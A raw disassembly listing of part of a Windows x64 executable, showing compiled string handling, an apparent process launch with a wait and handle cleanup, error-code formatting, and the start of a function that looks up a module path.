   14000246e:	49 ba cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r10
   140002475:	cc cc cc 
   140002478:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000247f:	00 
   140002480:	49 ff c9             	dec    %r9
   140002483:	49 8b c2             	mov    %r10,%rax
   140002486:	49 f7 e0             	mul    %r8
   140002489:	48 c1 ea 03          	shr    $0x3,%rdx
   14000248d:	0f b6 c2             	movzbl %dl,%eax
   140002490:	c0 e0 02             	shl    $0x2,%al
   140002493:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   140002496:	02 c9                	add    %cl,%cl
   140002498:	44 2a c1             	sub    %cl,%r8b
   14000249b:	41 80 c0 30          	add    $0x30,%r8b
   14000249f:	45 88 01             	mov    %r8b,(%r9)
   1400024a2:	4c 8b c2             	mov    %rdx,%r8
   1400024a5:	48 85 d2             	test   %rdx,%rdx
   1400024a8:	75 d6                	jne    0x140002480
   1400024aa:	4c 8d 85 95 01 00 00 	lea    0x195(%rbp),%r8
   1400024b1:	49 8b d1             	mov    %r9,%rdx
   1400024b4:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   1400024b8:	e8 c3 2c 00 00       	call   0x140005180
   1400024bd:	90                   	nop
   1400024be:	4c 8b 45 a8          	mov    -0x58(%rbp),%r8
   1400024c2:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400024c6:	48 8b c1             	mov    %rcx,%rax
   1400024c9:	49 2b c0             	sub    %r8,%rax
   1400024cc:	41 be 23 00 00 00    	mov    $0x23,%r14d
   1400024d2:	48 8d 3d b7 23 03 00 	lea    0x323b7(%rip),%rdi        # 0x140034890
   1400024d9:	49 3b c6             	cmp    %r14,%rax
   1400024dc:	72 78                	jb     0x140002556
   1400024de:	49 8d 40 23          	lea    0x23(%r8),%rax
   1400024e2:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   1400024e6:	48 8d 5d 98          	lea    -0x68(%rbp),%rbx
   1400024ea:	48 83 f9 0f          	cmp    $0xf,%rcx
   1400024ee:	48 0f 47 5d 98       	cmova  -0x68(%rbp),%rbx
   1400024f3:	48 8d 05 b9 23 03 00 	lea    0x323b9(%rip),%rax        # 0x1400348b3
   1400024fa:	48 3b c3             	cmp    %rbx,%rax
   1400024fd:	76 1b                	jbe    0x14000251a
   1400024ff:	4a 8d 04 03          	lea    (%rbx,%r8,1),%rax
   140002503:	48 3b f8             	cmp    %rax,%rdi
   140002506:	77 12                	ja     0x14000251a
   140002508:	48 3b df             	cmp    %rdi,%rbx
   14000250b:	77 05                	ja     0x140002512
   14000250d:	49 8b f4             	mov    %r12,%rsi
   140002510:	eb 0b                	jmp    0x14000251d
   140002512:	48 8b f3             	mov    %rbx,%rsi
   140002515:	48 2b f7             	sub    %rdi,%rsi
   140002518:	eb 03                	jmp    0x14000251d
   14000251a:	49 8b f6             	mov    %r14,%rsi
   14000251d:	49 ff c0             	inc    %r8
   140002520:	48 8d 4b 23          	lea    0x23(%rbx),%rcx
   140002524:	48 8b d3             	mov    %rbx,%rdx
   140002527:	e8 14 3d 02 00       	call   0x140026240
   14000252c:	4c 8b c6             	mov    %rsi,%r8
   14000252f:	48 8b d7             	mov    %rdi,%rdx
   140002532:	48 8b cb             	mov    %rbx,%rcx
   140002535:	e8 06 3d 02 00       	call   0x140026240
   14000253a:	4c 2b f6             	sub    %rsi,%r14
   14000253d:	48 8d 57 23          	lea    0x23(%rdi),%rdx
   140002541:	48 03 d6             	add    %rsi,%rdx
   140002544:	48 8d 0c 33          	lea    (%rbx,%rsi,1),%rcx
   140002548:	4d 8b c6             	mov    %r14,%r8
   14000254b:	e8 f0 3c 02 00       	call   0x140026240
   140002550:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   140002554:	eb 16                	jmp    0x14000256c
   140002556:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   14000255b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002560:	49 8b d6             	mov    %r14,%rdx
   140002563:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   140002567:	e8 f4 42 00 00       	call   0x140006860
   14000256c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000256f:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140002574:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140002579:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   14000257e:	0f 10 00             	movups (%rax),%xmm0
   140002581:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140002586:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   14000258a:	0f 11 4c 24 60       	movups %xmm1,0x60(%rsp)
   14000258f:	4c 89 60 10          	mov    %r12,0x10(%rax)
   140002593:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   14000259a:	00 
   14000259b:	c6 00 00             	movb   $0x0,(%rax)
   14000259e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400025a3:	e8 18 f9 ff ff       	call   0x140001ec0
   1400025a8:	90                   	nop
   1400025a9:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1400025ae:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400025b2:	76 37                	jbe    0x1400025eb
   1400025b4:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400025b9:	48 ff c2             	inc    %rdx
   1400025bc:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400025c3:	72 1e                	jb     0x1400025e3
   1400025c5:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400025c9:	48 2b c1             	sub    %rcx,%rax
   1400025cc:	48 83 e8 08          	sub    $0x8,%rax
   1400025d0:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400025d4:	77 06                	ja     0x1400025dc
   1400025d6:	48 83 c2 27          	add    $0x27,%rdx
   1400025da:	eb 0a                	jmp    0x1400025e6
   1400025dc:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400025e1:	cd 29                	int    $0x29
   1400025e3:	48 8b c8             	mov    %rax,%rcx
   1400025e6:	e8 29 5f 00 00       	call   0x140008514
   1400025eb:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   1400025f0:	48 c7 44 24 68 0f 00 	movq   $0xf,0x68(%rsp)
   1400025f7:	00 00 
   1400025f9:	c6 44 24 50 00       	movb   $0x0,0x50(%rsp)
   1400025fe:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140002602:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002606:	76 33                	jbe    0x14000263b
   140002608:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   14000260c:	48 ff c2             	inc    %rdx
   14000260f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002616:	72 1b                	jb     0x140002633
   140002618:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000261c:	48 2b c1             	sub    %rcx,%rax
   14000261f:	48 83 e8 08          	sub    $0x8,%rax
   140002623:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002627:	0f 87 73 03 00 00    	ja     0x1400029a0
   14000262d:	48 83 c2 27          	add    $0x27,%rdx
   140002631:	eb 03                	jmp    0x140002636
   140002633:	48 8b c8             	mov    %rax,%rcx
   140002636:	e8 d9 5e 00 00       	call   0x140008514
   14000263b:	c7 85 10 01 00 00 68 	movl   $0x68,0x110(%rbp)
   140002642:	00 00 00 
   140002645:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002648:	0f 11 85 18 01 00 00 	movups %xmm0,0x118(%rbp)
   14000264f:	0f 11 85 28 01 00 00 	movups %xmm0,0x128(%rbp)
   140002656:	0f 11 85 38 01 00 00 	movups %xmm0,0x138(%rbp)
   14000265d:	0f 11 85 48 01 00 00 	movups %xmm0,0x148(%rbp)
   140002664:	0f 11 85 58 01 00 00 	movups %xmm0,0x158(%rbp)
   14000266b:	0f 11 85 68 01 00 00 	movups %xmm0,0x168(%rbp)
   140002672:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140002676:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000267b:	48 8d 85 10 01 00 00 	lea    0x110(%rbp),%rax
   140002682:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002687:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   14000268c:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   140002691:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140002696:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   14000269b:	45 33 c9             	xor    %r9d,%r9d
   14000269e:	45 33 c0             	xor    %r8d,%r8d
   1400026a1:	33 d2                	xor    %edx,%edx
   1400026a3:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   1400026aa:	ff 15 b8 59 02 00    	call   *0x259b8(%rip)        # 0x140028068
   1400026b0:	85 c0                	test   %eax,%eax
   1400026b2:	0f 84 29 01 00 00    	je     0x1400027e1
   1400026b8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400026bb:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400026c0:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   1400026c5:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   1400026ca:	41 b8 26 00 00 00    	mov    $0x26,%r8d
   1400026d0:	48 8d 15 e1 21 03 00 	lea    0x321e1(%rip),%rdx        # 0x1400348b8
   1400026d7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400026dc:	e8 3f 2f 00 00       	call   0x140005620
   1400026e1:	90                   	nop
   1400026e2:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400026e7:	e8 d4 f7 ff ff       	call   0x140001ec0
   1400026ec:	90                   	nop
   1400026ed:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1400026f2:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400026f6:	76 34                	jbe    0x14000272c
   1400026f8:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400026fd:	48 ff c2             	inc    %rdx
   140002700:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002707:	72 1b                	jb     0x140002724
   140002709:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000270d:	48 2b c1             	sub    %rcx,%rax
   140002710:	48 83 e8 08          	sub    $0x8,%rax
   140002714:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002718:	0f 87 82 02 00 00    	ja     0x1400029a0
   14000271e:	48 83 c2 27          	add    $0x27,%rdx
   140002722:	eb 03                	jmp    0x140002727
   140002724:	48 8b c8             	mov    %rax,%rcx
   140002727:	e8 e8 5d 00 00       	call   0x140008514
   14000272c:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140002731:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140002735:	ff 15 55 59 02 00    	call   *0x25955(%rip)        # 0x140028090
   14000273b:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000273f:	ff 15 2b 59 02 00    	call   *0x2592b(%rip)        # 0x140028070
   140002745:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140002749:	ff 15 21 59 02 00    	call   *0x25921(%rip)        # 0x140028070
   14000274f:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   140002756:	ff 15 1c 59 02 00    	call   *0x2591c(%rip)        # 0x140028078
   14000275c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000275f:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140002764:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140002769:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   14000276e:	41 b8 2e 00 00 00    	mov    $0x2e,%r8d
   140002774:	48 8d 15 65 21 03 00 	lea    0x32165(%rip),%rdx        # 0x1400348e0
   14000277b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002780:	e8 9b 2e 00 00       	call   0x140005620
   140002785:	90                   	nop
   140002786:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000278b:	e8 30 f7 ff ff       	call   0x140001ec0
   140002790:	90                   	nop
   140002791:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140002796:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000279a:	76 3e                	jbe    0x1400027da
   14000279c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400027a1:	48 ff c2             	inc    %rdx
   1400027a4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400027ab:	72 25                	jb     0x1400027d2
   1400027ad:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400027b1:	48 2b c1             	sub    %rcx,%rax
   1400027b4:	48 83 e8 08          	sub    $0x8,%rax
   1400027b8:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400027bc:	0f 87 de 01 00 00    	ja     0x1400029a0
   1400027c2:	48 83 c2 27          	add    $0x27,%rdx
   1400027c6:	e8 49 5d 00 00       	call   0x140008514
   1400027cb:	b3 01                	mov    $0x1,%bl
   1400027cd:	e9 ec 01 00 00       	jmp    0x1400029be
   1400027d2:	48 8b c8             	mov    %rax,%rcx
   1400027d5:	e8 3a 5d 00 00       	call   0x140008514
   1400027da:	b3 01                	mov    $0x1,%bl
   1400027dc:	e9 dd 01 00 00       	jmp    0x1400029be
   1400027e1:	ff 15 99 58 02 00    	call   *0x25899(%rip)        # 0x140028080
   1400027e7:	44 8b c0             	mov    %eax,%r8d
   1400027ea:	4c 8d 8d 95 01 00 00 	lea    0x195(%rbp),%r9
   1400027f1:	49 ff c9             	dec    %r9
   1400027f4:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
   1400027f9:	41 f7 e0             	mul    %r8d
   1400027fc:	c1 ea 03             	shr    $0x3,%edx
   1400027ff:	0f b6 c2             	movzbl %dl,%eax
   140002802:	c0 e0 02             	shl    $0x2,%al
   140002805:	8d 0c 10             	lea    (%rax,%rdx,1),%ecx
   140002808:	02 c9                	add    %cl,%cl
   14000280a:	44 2a c1             	sub    %cl,%r8b
   14000280d:	41 80 c0 30          	add    $0x30,%r8b
   140002811:	45 88 01             	mov    %r8b,(%r9)
   140002814:	44 8b c2             	mov    %edx,%r8d
   140002817:	85 d2                	test   %edx,%edx
   140002819:	75 d6                	jne    0x1400027f1
   14000281b:	4c 8d 85 95 01 00 00 	lea    0x195(%rbp),%r8
   140002822:	49 8b d1             	mov    %r9,%rdx
   140002825:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140002829:	e8 52 29 00 00       	call   0x140005180
   14000282e:	90                   	nop
   14000282f:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
   140002833:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140002837:	48 8b c1             	mov    %rcx,%rax
   14000283a:	49 2b c0             	sub    %r8,%rax
   14000283d:	41 be 29 00 00 00    	mov    $0x29,%r14d
   140002843:	48 8d 3d c6 20 03 00 	lea    0x320c6(%rip),%rdi        # 0x140034910
   14000284a:	49 3b c6             	cmp    %r14,%rax
   14000284d:	72 78                	jb     0x1400028c7
   14000284f:	49 8d 40 29          	lea    0x29(%r8),%rax
   140002853:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140002857:	48 8d 5d b8          	lea    -0x48(%rbp),%rbx
   14000285b:	48 83 f9 0f          	cmp    $0xf,%rcx
   14000285f:	48 0f 47 5d b8       	cmova  -0x48(%rbp),%rbx
   140002864:	48 8d 05 ce 20 03 00 	lea    0x320ce(%rip),%rax        # 0x140034939
   14000286b:	48 3b c3             	cmp    %rbx,%rax
   14000286e:	76 1b                	jbe    0x14000288b
   140002870:	4a 8d 04 03          	lea    (%rbx,%r8,1),%rax
   140002874:	48 3b f8             	cmp    %rax,%rdi
   140002877:	77 12                	ja     0x14000288b
   140002879:	48 3b df             	cmp    %rdi,%rbx
   14000287c:	77 05                	ja     0x140002883
   14000287e:	49 8b f4             	mov    %r12,%rsi
   140002881:	eb 0b                	jmp    0x14000288e
   140002883:	48 8b f3             	mov    %rbx,%rsi
   140002886:	48 2b f7             	sub    %rdi,%rsi
   140002889:	eb 03                	jmp    0x14000288e
   14000288b:	49 8b f6             	mov    %r14,%rsi
   14000288e:	49 ff c0             	inc    %r8
   140002891:	48 8d 4b 29          	lea    0x29(%rbx),%rcx
   140002895:	48 8b d3             	mov    %rbx,%rdx
   140002898:	e8 a3 39 02 00       	call   0x140026240
   14000289d:	4c 8b c6             	mov    %rsi,%r8
   1400028a0:	48 8b d7             	mov    %rdi,%rdx
   1400028a3:	48 8b cb             	mov    %rbx,%rcx
   1400028a6:	e8 95 39 02 00       	call   0x140026240
   1400028ab:	4c 2b f6             	sub    %rsi,%r14
   1400028ae:	48 8d 57 29          	lea    0x29(%rdi),%rdx
   1400028b2:	48 03 d6             	add    %rsi,%rdx
   1400028b5:	48 8d 0c 33          	lea    (%rbx,%rsi,1),%rcx
   1400028b9:	4d 8b c6             	mov    %r14,%r8
   1400028bc:	e8 7f 39 02 00       	call   0x140026240
   1400028c1:	48 8d 45 b8          	lea    -0x48(%rbp),%rax
   1400028c5:	eb 16                	jmp    0x1400028dd
   1400028c7:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400028cc:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400028d1:	49 8b d6             	mov    %r14,%rdx
   1400028d4:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400028d8:	e8 83 3f 00 00       	call   0x140006860
   1400028dd:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400028e0:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400028e5:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   1400028ea:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   1400028ef:	0f 10 00             	movups (%rax),%xmm0
   1400028f2:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400028f7:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400028fb:	0f 11 4c 24 60       	movups %xmm1,0x60(%rsp)
   140002900:	4c 89 60 10          	mov    %r12,0x10(%rax)
   140002904:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   14000290b:	00 
   14000290c:	c6 00 00             	movb   $0x0,(%rax)
   14000290f:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002914:	e8 a7 f5 ff ff       	call   0x140001ec0
   140002919:	90                   	nop
   14000291a:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   14000291f:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002923:	76 37                	jbe    0x14000295c
   140002925:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000292a:	48 ff c2             	inc    %rdx
   14000292d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002934:	72 1e                	jb     0x140002954
   140002936:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000293a:	48 2b c1             	sub    %rcx,%rax
   14000293d:	48 83 e8 08          	sub    $0x8,%rax
   140002941:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002945:	77 06                	ja     0x14000294d
   140002947:	48 83 c2 27          	add    $0x27,%rdx
   14000294b:	eb 0a                	jmp    0x140002957
   14000294d:	b9 05 00 00 00       	mov    $0x5,%ecx
   140002952:	cd 29                	int    $0x29
   140002954:	48 8b c8             	mov    %rax,%rcx
   140002957:	e8 b8 5b 00 00       	call   0x140008514
   14000295c:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140002961:	48 c7 44 24 68 0f 00 	movq   $0xf,0x68(%rsp)
   140002968:	00 00 
   14000296a:	c6 44 24 50 00       	movb   $0x0,0x50(%rsp)
   14000296f:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   140002973:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002977:	76 36                	jbe    0x1400029af
   140002979:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   14000297d:	48 ff c2             	inc    %rdx
   140002980:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002987:	72 1e                	jb     0x1400029a7
   140002989:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000298d:	48 2b c1             	sub    %rcx,%rax
   140002990:	48 83 e8 08          	sub    $0x8,%rax
   140002994:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002998:	77 06                	ja     0x1400029a0
   14000299a:	48 83 c2 27          	add    $0x27,%rdx
   14000299e:	eb 0a                	jmp    0x1400029aa
   1400029a0:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400029a5:	cd 29                	int    $0x29
   1400029a7:	48 8b c8             	mov    %rax,%rcx
   1400029aa:	e8 65 5b 00 00       	call   0x140008514
   1400029af:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   1400029b6:	ff 15 bc 56 02 00    	call   *0x256bc(%rip)        # 0x140028078
   1400029bc:	32 db                	xor    %bl,%bl
   1400029be:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400029c2:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400029c6:	48 8d 05 0b 22 03 00 	lea    0x3220b(%rip),%rax        # 0x140034bd8
   1400029cd:	48 89 44 0d 00       	mov    %rax,0x0(%rbp,%rcx,1)
   1400029d2:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400029d6:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400029da:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   1400029e0:	89 54 0d fc          	mov    %edx,-0x4(%rbp,%rcx,1)
   1400029e4:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   1400029e8:	e8 63 21 00 00       	call   0x140004b50
   1400029ed:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400029f1:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400029f5:	48 8d 05 3c 22 03 00 	lea    0x3223c(%rip),%rax        # 0x140034c38
   1400029fc:	48 89 44 0d 00       	mov    %rax,0x0(%rbp,%rcx,1)
   140002a01:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   140002a05:	48 63 51 04          	movslq 0x4(%rcx),%rdx
   140002a09:	44 8d 42 f0          	lea    -0x10(%rdx),%r8d
   140002a0d:	44 89 44 15 fc       	mov    %r8d,-0x4(%rbp,%rdx,1)
   140002a12:	48 8d 05 2f 21 03 00 	lea    0x3212f(%rip),%rax        # 0x140034b48
   140002a19:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140002a20:	48 8d 8d a8 00 00 00 	lea    0xa8(%rbp),%rcx
   140002a27:	e8 e8 51 00 00       	call   0x140007c14
   140002a2c:	90                   	nop
   140002a2d:	0f b6 c3             	movzbl %bl,%eax
   140002a30:	48 8b 8d c0 03 00 00 	mov    0x3c0(%rbp),%rcx
   140002a37:	48 33 cc             	xor    %rsp,%rcx
   140002a3a:	e8 71 5a 00 00       	call   0x1400084b0
   140002a3f:	4c 8d 9c 24 d0 04 00 	lea    0x4d0(%rsp),%r11
   140002a46:	00 
   140002a47:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140002a4b:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140002a4f:	49 8b e3             	mov    %r11,%rsp
   140002a52:	41 5f                	pop    %r15
   140002a54:	41 5e                	pop    %r14
   140002a56:	41 5c                	pop    %r12
   140002a58:	5f                   	pop    %rdi
   140002a59:	5d                   	pop    %rbp
   140002a5a:	c3                   	ret
   140002a5b:	a8 04                	test   $0x4,%al
   140002a5d:	74 09                	je     0x140002a68
   140002a5f:	48 8d 1d 72 1d 03 00 	lea    0x31d72(%rip),%rbx        # 0x1400347d8
   140002a66:	eb 14                	jmp    0x140002a7c
   140002a68:	84 c2                	test   %al,%dl
   140002a6a:	48 8d 1d 7f 1d 03 00 	lea    0x31d7f(%rip),%rbx        # 0x1400347f0
   140002a71:	48 8d 05 90 1d 03 00 	lea    0x31d90(%rip),%rax        # 0x140034808
   140002a78:	48 0f 44 d8          	cmove  %rax,%rbx
   140002a7c:	ba 01 00 00 00       	mov    $0x1,%edx
   140002a81:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   140002a88:	e8 03 ea ff ff       	call   0x140001490
   140002a8d:	4c 8b c0             	mov    %rax,%r8
   140002a90:	48 8b d3             	mov    %rbx,%rdx
   140002a93:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002a98:	e8 b3 f2 ff ff       	call   0x140001d50
   140002a9d:	48 8d 15 0c 65 03 00 	lea    0x3650c(%rip),%rdx        # 0x140038fb0
   140002aa4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002aa9:	e8 1a 75 00 00       	call   0x140009fc8
   140002aae:	cc                   	int3
   140002aaf:	cc                   	int3
   140002ab0:	40 55                	rex push %rbp
   140002ab2:	53                   	push   %rbx
   140002ab3:	56                   	push   %rsi
   140002ab4:	57                   	push   %rdi
   140002ab5:	41 54                	push   %r12
   140002ab7:	41 56                	push   %r14
   140002ab9:	41 57                	push   %r15
   140002abb:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   140002ac2:	ff 
   140002ac3:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140002aca:	48 8b 05 af 75 03 00 	mov    0x375af(%rip),%rax        # 0x14003a080
   140002ad1:	48 33 c4             	xor    %rsp,%rax
   140002ad4:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   140002adb:	45 33 e4             	xor    %r12d,%r12d
   140002ade:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002ae1:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002ae6:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002aeb:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140002af0:	41 b8 14 00 00 00    	mov    $0x14,%r8d
   140002af6:	48 8d 15 43 1e 03 00 	lea    0x31e43(%rip),%rdx        # 0x140034940
   140002afd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b02:	e8 19 2b 00 00       	call   0x140005620
   140002b07:	90                   	nop
   140002b08:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b0d:	e8 ae f3 ff ff       	call   0x140001ec0
   140002b12:	90                   	nop
   140002b13:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002b18:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002b1c:	76 34                	jbe    0x140002b52
   140002b1e:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002b23:	48 ff c2             	inc    %rdx
   140002b26:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002b2d:	72 1b                	jb     0x140002b4a
   140002b2f:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140002b33:	48 2b c1             	sub    %rcx,%rax
   140002b36:	48 83 e8 08          	sub    $0x8,%rax
   140002b3a:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002b3e:	0f 87 50 0c 00 00    	ja     0x140003794
   140002b44:	48 83 c2 27          	add    $0x27,%rdx
   140002b48:	eb 03                	jmp    0x140002b4d
   140002b4a:	48 8b c8             	mov    %rax,%rcx
   140002b4d:	e8 c2 59 00 00       	call   0x140008514
   140002b52:	ff 15 00 55 02 00    	call   *0x25500(%rip)        # 0x140028058
   140002b58:	85 c0                	test   %eax,%eax
   140002b5a:	74 77                	je     0x140002bd3
   140002b5c:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002b5f:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002b64:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002b69:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140002b6e:	41 b8 1a 00 00 00    	mov    $0x1a,%r8d
   140002b74:	48 8d 15 dd 1d 03 00 	lea    0x31ddd(%rip),%rdx        # 0x140034958
   140002b7b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b80:	e8 9b 2a 00 00       	call   0x140005620
   140002b85:	90                   	nop
   140002b86:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002b8b:	e8 30 f3 ff ff       	call   0x140001ec0
   140002b90:	90                   	nop
   140002b91:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002b96:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002b9a:	0f 86 03 0c 00 00    	jbe    0x1400037a3
   140002ba0:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140002ba5:	48 ff c2             	inc    %rdx
   140002ba8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002baf:	0f 82 e6 0b 00 00    	jb     0x14000379b
   140002bb5:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140002bb9:	48 2b c1             	sub    %rcx,%rax
   140002bbc:	48 83 e8 08          	sub    $0x8,%rax
   140002bc0:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002bc4:	0f 87 ca 0b 00 00    	ja     0x140003794
   140002bca:	48 83 c2 27          	add    $0x27,%rdx
   140002bce:	e9 cb 0b 00 00       	jmp    0x14000379e
   140002bd3:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002bd9:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140002bdd:	33 c9                	xor    %ecx,%ecx
   140002bdf:	ff 15 6b 54 02 00    	call   *0x2546b(%rip)        # 0x140028050
   140002be5:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002be8:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140002bec:	4c 89 65 10          	mov    %r12,0x10(%rbp)
   140002bf0:	4c 89 65 18          	mov    %r12,0x18(%rbp)
   140002bf4:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
